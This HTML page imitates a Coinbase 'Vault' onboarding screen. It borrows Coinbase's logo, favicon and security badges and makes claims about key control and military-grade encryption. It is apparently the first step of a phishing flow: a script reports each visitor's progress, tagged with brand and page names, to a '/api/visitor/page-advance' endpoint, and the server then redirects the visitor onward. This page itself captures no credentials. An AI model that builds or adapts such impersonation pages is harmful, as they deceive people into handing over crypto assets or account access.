<!doctype html>
<html lang="en" class="dark" style="color-scheme: dark;">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Coinbase Vault</title>
<link rel="icon" href="https://coinbase.com/favicon.ico">
<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
<style>
.rv-vault{min-height:100vh;background:#000;color:#fff;font-family:'CoinbaseSansFont',system-ui,sans-serif;padding:20px 20px 32px;box-sizing:border-box;display:flex;flex-direction:column;max-width:480px;margin:0 auto}
.rv-brand{display:flex;align-items:baseline;gap:6px;margin-bottom:16px}
.rv-brand span{font-size:11px;font-weight:700;letter-spacing:.12em;color:#94a3b8}
.rv-progress{display:flex;gap:4px;margin-bottom:28px}
.rv-progress i{flex:1;height:4px;border-radius:2px;background:#1f2937}
.rv-progress i.on{background:rgb(87,139,250)}
.rv-title{font-size:26px;font-weight:700;margin:0;line-height:1.2}
.rv-sub{color:#94a3b8;font-size:15px;margin:10px 0 24px;line-height:1.5}
.rv-illus{background:#111;border-radius:16px;padding:32px 20px;margin-bottom:28px;display:flex;justify-content:center;align-items:center;min-height:140px}
.rv-illus-inner{display:flex;align-items:flex-end;gap:12px}
.rv-box{width:56px;height:56px;border-radius:14px;background:rgb(87,139,250);display:flex;align-items:center;justify-content:center}
.rv-box.mid{width:40px;height:40px;background:#1e293b;margin-bottom:20px}
.rv-box.sm{width:48px;height:48px;background:#1e3a5f}
.rv-pillar{width:8px;height:48px;border-radius:4px;background:linear-gradient(180deg,#ec4899,#14b8a6);margin:0 4px 8px}
.rv-btn{width:100%;height:52px;border-radius:9999px;font-weight:600;font-size:16px;cursor:pointer;border:0;background:rgb(87,139,250);color:#0a0b0d;font-family:inherit}
.rv-bullets{margin:24px 0 0;padding:0;list-style:none}
.rv-bullets li{display:flex;align-items:flex-start;gap:10px;color:#e2e8f0;font-size:14px;margin-bottom:12px;line-height:1.4}
.rv-bullets li::before{content:'';width:6px;height:6px;border-radius:50%;background:rgb(87,139,250);margin-top:7px;flex-shrink:0}
.rv-support{margin-top:auto;padding-top:24px;border-top:1px solid #1f2937;color:#6b7280;font-size:13px;display:flex;align-items:center;justify-content:space-between}
.rv-secured{text-align:center;font-size:11px;color:#4b5563;margin-top:12px}
</style>
</head>
<body style="margin:0">
<div class="rv-vault">
  <div class="rv-brand">
    <svg width="100" height="20" viewBox="0 0 688 123" aria-label="coinbase"><path d="M44.35 52.67h42.87C83.41 48.21 66.53 34.34 44.52 34.34 19.53 34.34 0 53.33 0 78.75c0 25.43 19.04 44.25 44.52 44.25 22.02 0 38.9-13.87 42.8-18.33H44.35c-10.43 0-20.53-11.06-20.53-25.92 0-14.86 10.09-25.92 20.53-25.92z" fill="#fff"/><path d="M138.86 34.34c-25 0-44.53 19-44.53 44.41 0 25.42 19.04 44.65 44.53 44.65 25.48 0 44.85-19.15 44.85-44.41 0-25.26-19.67-44.65-44.85-44.65zm.17 70.33c-14.23 0-24.66-11.06-24.66-25.92 0-14.86 10.26-25.92 24.66-25.92 14.4 0 24.82 11.23 24.82 25.92 0 14.86-10.42 25.92-24.82 25.92z" fill="#fff"/></svg>
    <span>VAULT</span>
  </div>
  <div class="rv-progress"><i class="on"></i><i></i><i></i><i></i><i></i></div>
  <h1 class="rv-title">Your keys, your coins</h1>
  <p class="rv-sub">Take full control of your crypto assets with industry-leading security.</p>
  <div class="rv-illus">
    <div class="rv-illus-inner">
      <div class="rv-box"><svg width="24" height="24" viewBox="0 0 48 48"><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0a0b0d"/></svg></div>
      <div class="rv-pillar"></div>
      <div class="rv-box mid"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></div>
      <div class="rv-box sm"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3"/></svg></div>
    </div>
  </div>
  <button id="rv-next" type="button" class="rv-btn">Next</button>
  <ul class="rv-bullets">
    <li>Earn staking rewards on stored assets</li>
    <li>Military-grade encryption &amp; cold storage</li>
    <li>Full control of your keys and data</li>
  </ul>
  <div class="rv-support"><span>✉ Chat with support</span><span>⌃</span></div>
  <p class="rv-secured">🔒 Secured by coinbase</p>
</div>
<script>
document.getElementById('rv-next').addEventListener('click',function(){
  var b=this; b.disabled=true;
  fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Vault Intro',choice:'next'})})
    .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;else b.disabled=false;});
});
</script>
</body>
</html>
